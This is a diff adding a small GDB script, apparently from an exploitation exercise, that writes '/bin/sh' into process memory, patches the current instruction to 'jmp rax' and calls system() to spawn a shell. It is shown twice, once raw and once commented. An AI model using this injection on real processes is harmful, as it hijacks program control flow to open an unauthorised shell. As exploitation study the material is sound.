@@ -1,0 +1,26 @@
+# --- Actual code ---
+
+set *140737351671808=1852400175
+set *140737351671812=6845231
+
+set *140737352710096=57599
+
+set $rax=system
+set $rdi=140737351671808
+
+continue
+
+# --- Somewhat readable code ---
+
+# write "/bin/sh\x00" in 0x7ffff7da6000
+set *0x7ffff7da6000=0x6e69622f
+set *0x7ffff7da6004=0x0068732f
+
+# write "jmp rax" in rip
+set *0x7ffff7ea37d0=0xe0ff
+
+# call system("/bin/sh\x00")
+set $rax=system
+set $rdi=0x7ffff7da6000
+
+continue
